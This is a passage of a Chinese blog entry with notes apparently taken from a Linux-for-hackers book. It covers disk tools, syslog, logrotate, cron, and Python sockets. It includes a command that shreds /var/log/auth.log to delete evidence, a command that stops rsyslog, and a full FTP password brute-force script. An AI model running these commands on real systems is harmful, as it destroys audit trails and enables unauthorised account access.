块设备和信息</h3><p>Linux 命令 lsblk (list block 的缩写)列出/dev 中列出的每个块设备的一些基本信息。结果类似于 fdisk -l 的输出，但它也将在一种树型结构中显示具有多个分区的设备，将每个设备的分区显示为分支，并且不需 要运行根特权。例如，在清单 10-3 中，我们看到了 sda 及其分支 sda1、sda2 和 sda5。 </p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;lsblk </span><br><span class="line">Name MAJ:MIN RM SIZE RO TYPE MOUNTPOINT </span><br><span class="line">fd0 2:0<span class="number"> 1 </span>4K<span class="number"> 0 </span>disk </span><br><span class="line">sda1 8:0<span class="number"> 0 </span>20G<span class="number"> 0 </span>disk </span><br><span class="line">|-sda1 8:1<span class="number"> 0 </span>18.7G<span class="number"> 0 </span>part / </span><br><span class="line">|-sda2 8:2<span class="number"> 0 </span>1K<span class="number"> 0 </span>part </span><br><span class="line">|-sda5 8:5<span class="number"> 0 </span>1.3G<span class="number"> 0 </span>part [SWAP] </span><br><span class="line"></span><br><span class="line">sdb 8:16<span class="number"> 1 </span>29.8G<span class="number"> 0 </span>disk </span><br><span class="line">|-sdb1 8.17<span class="number"> 1 </span>29.8G<span class="number"> 0 </span>disk /media </span><br><span class="line">sr0 11:0<span class="number"> 1 </span>2.7G<span class="number"> 0 </span>rom</span><br></pre></td></tr></table></figure><p>输出包括软盘驱动器作为 fd0, DVD 驱动器作为 sr0，尽管我的系统上没有软盘驱动器，这只是旧系统的 遗留。我们还可以在驱动器的挂载点上看到信息——这是驱动器附加到文件系统的位置。请注意，硬盘驱 动器 sda1 安装在/目录和闪存驱动器安装在/media 目录。</p><h3 id="自己安装存储设备"><a href="#自己安装存储设备" class="headerlink" title="自己安装存储设备"></a>自己安装存储设备</h3><p>mount  /dev/sdb1  /mnt         将新硬盘 sdb1 挂载到/mnt 目录</p><h3 id="卸载与-umount"><a href="#卸载与-umount" class="headerlink" title="卸载与 umount"></a>卸载与 umount</h3><p>umount  /dev/sdb1 </p><h3 id="获取挂载磁盘上的信息"><a href="#获取挂载磁盘上的信息" class="headerlink" title="获取挂载磁盘上的信息"></a>获取挂载磁盘上的信息</h3><p>命令 df(对于空余磁盘)将为我们提供关于任何硬盘或挂载设备(如 CD、DVD 和闪存驱动器)的基本信息， 包括正在使用的空间和可用空间(参见清单 10-4)。如果没有任何选项，df 默认为系统上的第一个驱动器(在 本例中是 sda)。如果您想检查另一个驱动器，只需使用您想检查的驱动器表示形式(例如，df sdb)遵循 df 命 令即可。 </p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;df  </span><br><span class="line">Filesystem <span class="number">1</span>K-Blocks Used Available Use% Mounted on </span><br><span class="line">rootfs <span class="number">19620732</span>    <span class="number">17096196</span> <span class="number">1504788</span> <span class="number">92</span>% / </span><br><span class="line">udev  <span class="number">10240</span> <span class="number">0</span> <span class="number">10240</span>   <span class="number">0</span>% /dev  </span><br><span class="line">­­snip--   </span><br><span class="line"> </span><br><span class="line">/dev/sdb1 <span class="number">29823024</span>  <span class="number">29712544</span> <span class="number">110480</span>  <span class="number">99</span>% /media/USB3<span class="number">.0</span></span><br></pre></td></tr></table></figure><p>这里的第一行输出我们得到的信息显示类别标题，磁盘空间以 1KB 块的形式给出。在第二行，我们看 到 rootfs 有 19,620,732 个 1 千字节的块，其中使用了 17,096,196 个块(约占 92%)，剩下 1,504,788 个可用。 df 命令还告诉我们这个文件系统安装在文件系统/根目录。<br>在最后一行，你可以看到我的 u 盘。注意，它被指定为/dev/sdb1，几乎 100%已满，挂载在/media/USB3.0。<br>综上所述，我在这个系统上的虚拟磁盘被指定为 sda1，它的信息如下:<br>sd SATA 硬盘<br>一个硬盘驱动器<br>驱动器上的第一个分区 </p><p>我的 64GB 闪存驱动器指定为 sdb1，我的外部驱动器指定为 sdc1</p><h3 id="检查错误"><a href="#检查错误" class="headerlink" title="检查错误"></a>检查错误</h3><p>fsck 命令(文件系统检查的缩写)检查文件系统的错误并修复损坏(如果可能的话)，或者将错误区域放入 一个错误块表中，将其标记为错误。要运行 fsck 命令，需要指定文件系统类型(默认为 ext2)和要检查的设 备文件。重要的是，在运行文件系统检查之前，必须卸载驱动器。</p><p>因此，执行文件系统检查的第一步是卸载设备。</p><p>kali &gt;umount  /dev/sdb1 </p><p>我可以添加-p 选项，让 fsck 自动修复</p><p>kali &gt;fsck  -p  /dev/sdb1 </p><p>在设备卸载后，我现在可以检查设备的任何坏扇区或其他问题，如下: </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;fsck  -p  /dev/sdb1  </span><br><span class="line">fsck <span class="keyword">from</span> util-linux 2.30.2  </span><br><span class="line">exfatfsck 1.2.7 </span><br><span class="line">Checking file<span class="built_in"> system </span>on /dev/sdb1.  </span><br><span class="line">File<span class="built_in"> system </span>version 1.0 </span><br><span class="line">Sector size 512 bytes </span><br><span class="line">Cluster size 32 KB </span><br><span class="line">Volume size 7648 MB </span><br><span class="line">Used space 1265 MB </span><br><span class="line">Available space 6383 MB  </span><br><span class="line">Totally 20 directories <span class="keyword">and</span> 111 files. </span><br><span class="line">File<span class="built_in"> system </span>checking finished. <span class="literal">No</span> errors found.</span><br></pre></td></tr></table></figure><h2 id="日志系统"><a href="#日志系统" class="headerlink" title="日志系统"></a>日志系统</h2><p>Linux 使用一个名为 syslogd 的守护进程来自动记录计算机上的事件。syslog 的几个变体，包括 rsyslog 和 syslog-ng</p><h3 id="rsyslog日志记录规则"><a href="#rsyslog日志记录规则" class="headerlink" title="rsyslog日志记录规则"></a>rsyslog日志记录规则</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">###############  </span><br><span class="line">#### RULES ####  </span><br><span class="line">###############  </span><br><span class="line"># </span><br><span class="line"><span class="number">117</span> </span><br><span class="line"># First some standard log files. Log by facility.  </span><br><span class="line"># </span><br><span class="line">auth,authpriv.* /var/log/auth.log </span><br><span class="line">*.*;auth,authpriv.none -/var/log/syslog  </span><br><span class="line">#cron.* /var/log/cron.log </span><br><span class="line">daemon.*  -/var/log/daemon.log  </span><br><span class="line">kern.* -/var/log/kern.log </span><br><span class="line"><span class="number">1</span>pr.* -/var/log/lpr.log </span><br><span class="line">mail.* -/var/log/mail.log </span><br><span class="line">user.* -/var/log/user.log </span><br><span class="line"> </span><br><span class="line"># </span><br><span class="line"># Logging for the mail <span class="keyword">system</span>. Split it up so that  </span><br><span class="line"># it is easy to write scripts to parse these files. </span><br><span class="line"># </span><br><span class="line">mail.info -/var/log/mail.info </span><br><span class="line">mail.warn -/var/log/mail.warn </span><br><span class="line">mail.err /var/log/mail.err</span><br></pre></td></tr></table></figure><p>每一行都是一个单独的日志记录规则，说明记录了哪些消息以及记录到哪里。这些规则的基本格式如<br>下: </p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">facility.<span class="built_in">priority</span> <span class="built_in">action</span></span><br></pre></td></tr></table></figure><p> facility 关键字引用正在记录其消息的程序，例如邮件、内核或打印系统。priority 关键字决定为该程序 记录哪种类型的消息。在最右边的 action 关键字引用将发送日志的位置。让我们更仔细地看一下每个部分， 首先是 facility 关键字，它指的是生成日志的任何软件，无论是内核、邮件系统还是用户。 </p><p>下面是一个有效的代码列表，可以用来代替我们的配置文件规则中的关键字 facility:<br>auth/authpriv 安全/授权消息<br>cron 时钟守护进程<br>daemon 其他守护进程<br>kern 内核消息<br>118<br>lpr 打印系统<br>mail 邮件系统<br>user 常规用户级别消息 </p><p>星号通配符（*）代替单词指的是所有信息。 您可以通过以逗号分隔的列表来选择多个。<br>优先级告诉系统要记录哪种消息。代码从最低优先级列出，从调试开始到最高优先级，以严重结束。 如果优先级为*，则记录所有优先级的消息。指定优先级时，将记录该优先级及更高优先级的消息。例如， 如果指定的优先级代码为告警 alert，系统将记录分类为告警和更高优先级的消息，但不会记录标记为 crit 的消息或低于警报的任何优先级。以下是有效优先级代码的完整列表： </p><p>• debug </p><p>• info </p><p>• notice</p><p>• warning </p><p>• warn </p><p>• error </p><p>• err </p><p>• crit </p><p>• alert </p><p>• emerg </p><p>• panic<br>warning、warn、error、err、emerg、panic，这些都已被弃用，不应该使用。 </p><p>操作通常是一个文件名和应该发送日志的位置。注意，通常，日志文件被发送到/var/log 目录，其文件 名描述为生成它们的工具，如 auth。这意味着，例如，由 auth 工具生成的日志将被发送到/var/log.auth.log。<br>让我们看一些日志规则的例子: </p><p>mail.* /var/log/mail<br>这个示例将所有(*)优先级的邮件事件记录到/var/log/mail 文件中。 </p><p>kern.crit /var/log/kernel<br>这个例子将把危险(crit)优先级或更高的内核事件记录到/var/log/kernel 中。 </p><p>*.emerg *<br>最后一个示例将记录所有登录用户的紧急事件(emerg)优先级的所有事件。</p><p>通过这些规则，黑客可以确 定日志文件的位置、更改优先级，甚至禁用特定的日志规则。 </p><h3 id="使用-LOGROTATE-自动清理日志"><a href="#使用-LOGROTATE-自动清理日志" class="headerlink" title="使用 LOGROTATE 自动清理日志"></a>使用 LOGROTATE 自动清理日志</h3><p>/etc/logrotate.conf </p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># see <span class="string">"man logrotate"</span> <span class="keyword">for</span> details  </span><br><span class="line"># <span class="keyword">rotate</span> <span class="keyword">log</span> files weekly </span><br><span class="line">➊ weekly </span><br><span class="line"> </span><br><span class="line"># <span class="keyword">keep</span> 4 weeks worth of backlogs </span><br><span class="line">➋ <span class="keyword">rotate</span> 4 </span><br><span class="line"> </span><br><span class="line">➌ # create new (empty) <span class="keyword">log</span> files after rotating old ones  </span><br><span class="line">create </span><br><span class="line"> </span><br><span class="line">➍ # uncomment this <span class="keyword">if</span> you want your <span class="keyword">log</span> files compressed  </span><br><span class="line">#<span class="keyword">compress</span> </span><br><span class="line"> </span><br><span class="line"># packages <span class="keyword">drop</span> <span class="keyword">log</span> rotation information into this directory  </span><br><span class="line"><span class="keyword">include</span> /etc/logrotate.<span class="keyword">d</span> </span><br><span class="line"> </span><br><span class="line"># <span class="keyword">no</span> packages own wtmp, or btmp -- we'll <span class="keyword">rotate</span> them here </span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/wtmp  </span><br><span class="line"> &#123;   missingok  </span><br><span class="line"> monthly </span><br><span class="line"> create 0664 root utmp  </span><br><span class="line">120 </span><br><span class="line"> <span class="keyword">rotate</span> 1 </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>第一，你可以设置的时间单位数字参考➊。这里的默认值是 weekly，这意味着 rotate 关键字之后的任 何数字总是指 weeks（周） 。<br>进一步往下看，你可以看到设置切割转储日志默认设置的频率是每四个星期转储日志➋。这个默认配 置对大多数人都适用，但是如果您想让您的日志更长一些，以便进行调查，或者更短一些，以便更快地清 除它们，那么您应该更改这个设置。例如，如果您每周检查日志文件并希望节省存储空间，可以将此设置 更改为 rotate 1。如果您的日志有足够的存储空间，并且希望保留半永久记录以便以后进行取证分析，那么 您可以将此设置更改为 rotate 26 以保存六个月的日志，或者将 rotate 52 更改为保存一年的日志。<br>默认情况下，创建一个新的空日志文件当做旧日志的切割备份➌。在配置文件中建议，你也可以选择 压缩转储的日志文件➍。 </p><p>在每个转储周期结束时，将重命名日志文件，并在创建新日志文件时将其推到日志链的末尾，以替换 当前日志文件。例如，/var/log.auth 将变成/var/log.auth.1，那么/var/log.auth.2，以此类推。如果您每四周 轮换一次日志，并保留四组备份，那么您将得到/var/log.auth.4，但是没有/var/log.auth.5。意思是旧的 /var/log.auth.4 将被删除，而不是被推到/var/log/auth.5</p><h3 id="删除证据"><a href="#删除证据" class="headerlink" title="删除证据"></a>删除证据</h3><p>shred 将删除文件并多次覆盖它——默认情况下，shred 将覆盖 4 次。通常，文件被 覆盖的次数越多，恢复起来就越困难，但是请记住，每次覆盖都需要时间，因此对于非常大的文件，碎片 化可能会很耗时。 </p><p>要包括两个有用的选项，一个是-f 选项，它更改文件的权限，以便在需要更改权限时允许覆盖；另一 个是-n 选项，它允许您选择覆盖文件的次数。</p><p>例如，我们将使用以下命令将/var/log/auth.log 中的日志文件 分解覆盖 10 次: </p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;shred  -f  -<span class="built_in">n</span>  <span class="number">10</span>  /<span class="built_in">var</span>/<span class="built_in">log</span>/auth.log.*</span><br></pre></td></tr></table></figure><h3 id="禁用日志记录"><a href="#禁用日志记录" class="headerlink" title="禁用日志记录"></a>禁用日志记录</h3><p>需要root权限</p><p>service  rsyslog  stop </p><h2 id="熟练使用服务"><a href="#熟练使用服务" class="headerlink" title="熟练使用服务"></a>熟练使用服务</h2><p>启动、停止和重新启动服务 </p><p>service servicename start|stop|restart </p><p>对黑客特别重要的四个：</p><p><strong>Apache Web Server，</strong></p><p><strong>OpenSSH，</strong></p><p><strong>MySQL ，</strong></p><p><strong>PostgreSQL 结合 Metasploit  。</strong> </p><h2 id="使用作业调度自动化任务"><a href="#使用作业调度自动化任务" class="headerlink" title="使用作业调度自动化任务"></a>使用作业调度自动化任务</h2><p>需要遵循的格式，</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">M   H  DOM  MON  DOW <span class="built_in"> USER </span> COMMAND </span><br><span class="line">30  2  * *   1-5  root  /root/myscanningscript</span><br></pre></td></tr></table></figure><p>leafpad  /etc/crontab </p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/crontab: system-wide crontab </span></span><br><span class="line"><span class="comment"># Unlike any other crontab, you don't have to run the 'crontab'  </span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file </span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,  </span></span><br><span class="line"><span class="comment"># which no other crontabs do. </span></span><br><span class="line"> </span><br><span class="line">SHELL=<span class="regexp">/bin/sh</span> PATH=<span class="regexp">/usr/local</span><span class="regexp">/sbin:/usr</span><span class="regexp">/local/bin</span><span class="symbol">:/sbin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/bin</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># m h dom mon dow user command </span></span><br><span class="line"><span class="number">17</span> * * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly </span><br><span class="line"><span class="number">25</span> <span class="number">6</span> * * * root test -x /usr/sbin/anacron II ( cd / &amp;&amp; run-parts  </span><br><span class="line"><span class="number">47</span> <span class="number">6</span> * * <span class="number">7</span> root test -x /usr/sbin/anacron II ( cd / &amp;&amp; run-parts  </span><br><span class="line"><span class="number">52</span> <span class="number">6</span> <span class="number">1</span> * * root test -x /usr/sbin/anacron II ( cd / &amp;&amp; run-parts  </span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="设置一个备份计划任务"><a href="#设置一个备份计划任务" class="headerlink" title="设置一个备份计划任务"></a>设置一个备份计划任务</h3><p>在 crontab 中添加下行： </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">00 </span><span class="number">2</span> * * <span class="number">0</span> backup /bin/systembackup.sh</span><br></pre></td></tr></table></figure><p>cron 守护进程将在每月周日早上 2 点执行那个脚本。  </p><h3 id="crontab快捷方式"><a href="#crontab快捷方式" class="headerlink" title="crontab快捷方式"></a>crontab快捷方式</h3><p>crontab 文件有些内置的快捷方式，用来代替具体的时间，日期，月份。它包含这些：<br>179<br>• @yearly </p><p>• @annually </p><p>• @monthly </p><p>• @weekly </p><p>• @daily </p><p>• @midnight </p><p>• @noon </p><p>• @reboot<br>所以，如果你希望 MySQL 扫描器每天午夜运行，你可以添加下行到 crontab 文件： </p><p>@midnight user /usr/share/MySQLsscanner.sh </p><h3 id="使用-RC-脚本开机运行任务"><a href="#使用-RC-脚本开机运行任务" class="headerlink" title="使用 RC 脚本开机运行任务"></a>使用 RC 脚本开机运行任务</h3><p>Linux运行级别</p><p>Linux 有多个运行级别，用于指示启动时需要启动哪些服务。例如，运行级别 1 是单用户工作状态， rc 脚本会根据运行级别运行。 </p><p>0 系统停机状态<br>1 单用户工作状态<br>2 – 5 多用户状态<br>6 重启 </p><p>你以使用 update-rc.d 命令为 rc.d 脚本添加启动时要运行的服务。此命令允许你从 rc.d 脚本中添加或删 除服务。update-rc.d 的语法很简单，输入命令，后面输入脚本的名字然后输入动作</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;update-rc.d  &lt;name  of  the <span class="built_in"> script </span> <span class="keyword">or</span>  service&gt;  &lt;remove|defaults|disable|enable&gt;</span><br></pre></td></tr></table></figure><p>举个update-rc.d的例子，假设你总是希望PostgreSQL 数据库在系统启动时运行，这样你的Metasploit 框 架可以使用它储存黑客攻击和渗透测试的结果。你需要使用 update-rc.d 添一行到你的 rc.d 脚本来让它每次 系统启动时运行。 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span>-rc.d  postgresql  <span class="keyword">defaults</span></span><br></pre></td></tr></table></figure><h2 id="PYTHON-网络通信"><a href="#PYTHON-网络通信" class="headerlink" title="PYTHON 网络通信"></a>PYTHON 网络通信</h2><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /usr/bin/python3 </span></span><br><span class="line">➊ <span class="keyword">import</span> socket </span><br><span class="line">➋ s = socket.socket() </span><br><span class="line">➌ s.connect((<span class="string">"192.168.1.101"</span>, <span class="number">22</span>)) </span><br><span class="line">➍ answer = s.recv(<span class="number">1024</span>) </span><br><span class="line">➎ print(answer)</span><br></pre></td></tr></table></figure><p>首先，我们导入 socket 模块➊，以便使用它的功能和工具。这里，我们将使用 socket 模块中的网络工 具来为我们处理通过网络连接的接口。Socket 为两个计算机节点提供了相互通信的方式。通常一个节点是服 务端一个是客户端。<br>然后我们创建了一个新的变量 s ，然后将它和 socket 模块中的 socket 类关联➋。这样，每当我们想使 用 socket 类时，就不必引用完整的 socket.socket（）语法，只需使用 s 变量名即可。<br>然后，我们使用 socket 模块➌中的 connect（）方法来建立到特定 IP 和端口的网络连接。记住，方法是 可用于特定对象的函数，语法为 object.method（例如 socket.connect）。这里，我连接到 IP 地址 192.168.1.101， 它是我网络上一台电脑的 IP 地址，22 端口是默认的 ssh 端口。您可以在 Linux 或 Kali 的另一个实例上对此 进行测试。大多数 22 端口是默认打开。<br>一旦你建立了联系，就可以做很多事情。这里我们使用接收方法 recv 来接收来自 socket 的 1024 bytes 数据 ➍ 并且将他们储存到一个叫 answer 的变量里；这 1024 bytes 包含了 banner 信息。然后，我们用 print （）函数将该变量的内容打印到屏幕上，以查看通过该 socket 传递的数据，从而允许我们监视它！在最后 一行，我们关闭连接。 </p><h3 id="创建-TCP-监听器"><a href="#创建-TCP-监听器" class="headerlink" title="创建 TCP 监听器"></a>创建 TCP 监听器</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/<span class="keyword">bin/python3 </span><span class="meta">import</span> socket </span><br><span class="line">➊ TCP_IP = <span class="string">"192.168.181.190"</span> TCP_PORT = <span class="number">6996</span> </span><br><span class="line"><span class="keyword">BUFFER_SIZE </span>= <span class="number">100</span> </span><br><span class="line"> </span><br><span class="line">➋ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">➌ s.<span class="keyword">bind((TCP_IP, </span>TCP_PORT)) </span><br><span class="line">➍ s.listen (<span class="number">1</span>) </span><br><span class="line"> </span><br><span class="line">➎ conn,<span class="keyword">addr </span>= s.accept() </span><br><span class="line"> print (<span class="string">'Connection address: '</span>, <span class="keyword">addr </span>)  </span><br><span class="line"> <span class="meta">while</span> <span class="number">1</span>: </span><br><span class="line"><span class="meta">data</span><span class="symbol">=conn</span>.recv(<span class="keyword">BUFFER_SIZE) </span></span><br><span class="line"><span class="meta">if</span> not <span class="meta">data</span>:</span><br><span class="line"><span class="keyword">break </span></span><br><span class="line">print (<span class="string">"Received data: "</span>, <span class="meta">data</span>)  </span><br><span class="line">  conn.send(<span class="meta">data</span>) <span class="symbol">#echo</span> </span><br><span class="line"> </span><br><span class="line"><span class="symbol">conn.close</span></span><br></pre></td></tr></table></figure><p>我们声明希望脚本使用 Python 解释器运行，然后像以前一样导入套接字模块，这样我们就可以使用它 的功能。然后，我们定义变量来保存 TCP/IP 地址、要监听的端口以及要从连接系统捕获的数据的缓冲区大 小的信息➊。<br>我们定义了 socket ➋，并使用刚才创建的变量将 socket 绑定到 IP 地址和端口➌。我们告诉 socket 使用 socket 库➍中的 listen()方法进行侦听。<br>然后，我们使用 socket 库的 accept 方法捕获连接系统的 IP 地址和端口，并将这些信息打印到屏幕上，<br>以便用户可以看到它➎。</p><p>现在，转到网络上的另一台计算机，使用浏览器连接到脚本中指定的 6996 端口。运行 tcp_server.py 脚 本，你应该能够连接和收集有关那个系统的关键信息，包括连接系统的 IP 地址和端口，如下所示： </p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;./tcp_server.py </span><br><span class="line">Connection <span class="string">Address:</span> (<span class="string">'192.168.181.190'</span>, <span class="number">45368</span>) Received <span class="string">data:</span> Get <span class="regexp">/HTTP/</span><span class="number">1.1</span> </span><br><span class="line"><span class="string">Host:</span><span class="number">192.168</span><span class="number">.181</span><span class="number">.190</span>:<span class="number">6996</span> </span><br><span class="line">User ­<span class="string">Agent:</span>Mozilla/<span class="number">5.0</span> (X11; Linux x86_64; <span class="string">rv:</span><span class="number">45.0</span>) Gec </span><br><span class="line"></span><br><span class="line">­­snip---</span><br></pre></td></tr></table></figure><p>这是黑客在决定攻击前收集的关键信息。漏洞攻击（或黑客攻击）是针对特定的操作系统、应用程序， 甚至是正在使用的语言，因此黑客需要在继续操作之前尽可能了解有关目标的信息。在黑客攻击之前收集信息的行为通常被称为侦察。</p><h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><p>这个脚本要求用户输入 ftp 服务器 号和要破解的 ftp 帐户的用户名。然后它读取一个包含可能密码列表的外部文本文件，并尝试每个密码来破 解 ftp 帐户。脚本执行此操作直到成功或密码用完。 </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python3 </span></span><br><span class="line">import ftplib </span><br><span class="line">➊<span class="built_in"> server </span>= input(FTP Server: <span class="string">") </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">➋ user = input("</span>username: <span class="string">") </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">➌ Passwordlist = input ("</span>Path <span class="keyword">to</span> Password List &gt; <span class="string">") </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">➍ try: </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">with open(Passwordlist, 'r') as pw:  </span></span><br><span class="line"><span class="string">for word in pw: </span></span><br><span class="line"><span class="string">➎ word = word.strip ('\r').strip('\n') </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">➏ try: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">ftp = ftplib.FTP(server)  </span></span><br><span class="line"><span class="string">ftp.login(user, word) </span></span><br><span class="line"><span class="string">➐print (Success! The password is ' + word) </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">➑ except: </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">print('still trying...') </span></span><br><span class="line"><span class="string">except: </span></span><br><span class="line"><span class="string">print ('Wordlist error')</span></span><br></pre></td></tr></table></figure><p>我们将使用 ftplib 模块中的工具来实现 FTP 协议，所以首先我们导入它。然后，我们创建一个名为 server 的变量和另一个名为 user 的变量，它将存储一些用户输入的命令。你的脚本将提示用户输入 FTP 服务器的 IP 地址➊和用户尝试进入的帐户的用户名➋。<br>然后我们询问用户密码列表➌的路径。通过在终端中输入 locate wordlist，您可以在 kali linux 中找到许 多密码列表。<br>然后，我们开始 try 代码块，该代码将使用用户提供的密码列表来尝试破解用户提供的用户名的密码。</p><p>注意，我们使用了一个新的名为 strip()➎的 python 函数。此函数删除字符串的第一个和最后一个字符 （在这里是密码列表）。如果此列表中的密码前面有空格或逗号，则需要执行此操作。strip()函数的作用是： 删除这些字符，只留下潜在密码的字符串。如果我们不去除空白，我们可能会得到一个假阴性。<br>然后，我们使用第二个 try➏代码块。这里，我们首先使用 ftplib 模块连接到用户提供的 IP 地址的服务 器，然后从该帐户的密码列表中尝试下一个密码。<br>如果用户名和密码的组合导致错误，则代码块退出并转到 except 子句➑，在该子句中打印 still trying， 然后返回到 for 子句的顶部并从密码列表中获取下一个密码以尝试。<br>如果组合成功，成功的密码将会被打印到屏幕上➐。最后一行记录任何其他可能导致错误的情况。例 如，如果用户输入程序无法处理的内容，例如单词表的路径错误或缺少单词表。<br>现在，让我们对 192.168.1.101 的 FTP 服务运行这个脚本，看看是否可以破解 root 用户的密码。我使用 的是我工作目录中名为 bigpasswordlist.txt 的密码列表。如果密码列表不在你的工作目录中，您可能需要提 供到所使用密码列表的完整路径（例如，/usr/share/bigpasswordlist.txt）。 </p><p>如果想要学习更多 Python 知识，强烈推荐由 Al Sweigart 编写的 No Starch Press 出版社 的优秀书籍《Automate the Boring Stuff with Python (2015)》。 </p>]]></content>
      
      
      <categories>
          
          <category> 工具小屋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 第五空间</title>
      <link href="/2019/08/29/2019%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/"/>
      <url>/2019/08/29/2019%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/</url>
      
